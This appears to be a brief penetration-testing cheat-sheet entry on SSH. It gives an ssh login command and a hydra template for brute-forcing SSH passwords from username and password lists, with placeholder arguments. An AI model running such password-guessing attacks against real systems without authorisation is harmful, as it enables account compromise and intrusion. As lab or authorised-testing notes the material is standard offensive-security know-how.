# Background
- If you are unable to access SSH through brute-forcing attempts, then you need to come back once you have confirmed credentials.

# Exploit

```
ssh [username]@[IP]
```

## Password Brute Force
```
hydra -s [22] -L [username list] -P [password list] [IP] [ssh] -e [ns] -w [5] -W [1] -vV
```
